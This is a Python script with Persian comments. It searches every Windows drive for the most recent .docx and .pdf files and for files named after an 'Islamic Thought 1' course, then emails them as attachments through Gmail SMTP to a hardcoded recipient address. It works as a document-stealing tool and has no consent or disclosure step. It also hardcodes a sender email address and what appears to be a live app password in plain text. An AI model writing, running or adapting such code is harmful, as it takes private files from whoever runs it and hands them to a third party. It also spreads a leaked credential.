import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import threading
import re

# تنظیمات ایمیل
SMTP_SERVER = 'smtp.gmail.com'  # تغییر دهید به سرور SMTP مورد نظر
SMTP_PORT = 465
EMAIL_USER = 'standblog2000@gmail.com'  # ایمیل ارسال‌کننده
EMAIL_PASSWORD = 'fbcxlvshrfcelhow'  # رمز عبور یا App Password
RECIPIENT_EMAIL = 'erfan.tavana1384@gmail.com'  # ایمیل گیرنده

def find_latest_files_on_drive(drive, extension, count=10):
    files = []

    for root, dirs, files_in_dir in os.walk(drive):
        for file in files_in_dir:
            if file.endswith(extension):
                file_path = os.path.join(root, file)
                file_time = os.path.getmtime(file_path)
                files.append((file_path, file_time))

    # مرتب‌سازی فایل‌ها بر اساس زمان ایجاد
    files.sort(key=lambda x: x[1], reverse=True)

    # بازگرداندن `count` فایل آخر
    return [file[0] for file in files[:count]]

def search_files_by_name(drive, patterns):
    matched_files = []

    for root, dirs, files_in_dir in os.walk(drive):
        for file in files_in_dir:
            for pattern in patterns:
                if re.search(pattern, file):
                    matched_files.append(os.path.join(root, file))

    return matched_files

def send_email_with_attachments(file_paths):
    # ساخت ایمیل
    msg = MIMEMultipart()
    msg['From'] = EMAIL_USER
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = 'Latest Files Found'

    body = 'Please find the requested files attached.'
    msg.attach(MIMEText(body, 'plain'))

    # افزودن فایل‌های پیوست
    for file_path in file_paths:
        attachment = MIMEBase('application', 'octet-stream')
        with open(file_path, 'rb') as f:
            attachment.set_payload(f.read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
        msg.attach(attachment)

    # ارسال ایمیل
    with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
        server.login(EMAIL_USER, EMAIL_PASSWORD)
        server.send_message(msg)

def find_and_send_files():
    # لیست درایوها برای جستجو
    drives = [f"{chr(d)}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]

    latest_docx_files = []
    latest_pdf_files = []

    for drive in drives:
        latest_docx_files.extend(find_latest_files_on_drive(drive, '.docx', count=10))
        latest_pdf_files.extend(find_latest_files_on_drive(drive, '.pdf', count=10))

    # حذف فایل‌های تکراری و محدود کردن به 10 فایل آخر
    latest_docx_files = sorted(set(latest_docx_files), key=lambda x: os.path.getmtime(x), reverse=True)[:10]
    latest_pdf_files = sorted(set(latest_pdf_files), key=lambda x: os.path.getmtime(x), reverse=True)[:10]

    all_latest_files = latest_docx_files + latest_pdf_files

    if all_latest_files:
        print(f'Latest files found: {all_latest_files}')
        send_email_with_attachments(all_latest_files)
        print('Email sent successfully for latest files!')
    else:
        print('No files found.')

def search_and_send_specific_files():
    # لیست درایوها برای جستجو
    drives = [f"{chr(d)}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]

    patterns = [
        r'اندیشه\s*اسلامی\s*یک\.docx',
        r'اندیشه\s*اسلامی\s*1\.pdf'
    ]

    specific_files = []
    for drive in drives:
        specific_files.extend(search_files_by_name(drive, patterns))

    if specific_files:
        print(f'Specific files found: {specific_files}')
        send_email_with_attachments(specific_files)
        print('Email sent successfully for specific files!')
    else:
        print('No specific files found.')

if __name__ == '__main__':
    # اجرای دو جستجو به صورت همزمان
    thread1 = threading.Thread(target=find_and_send_files)
    thread2 = threading.Thread(target=search_and_send_specific_files)

    thread1.start()
    thread2.start()

    thread1.join()
    thread2.join()
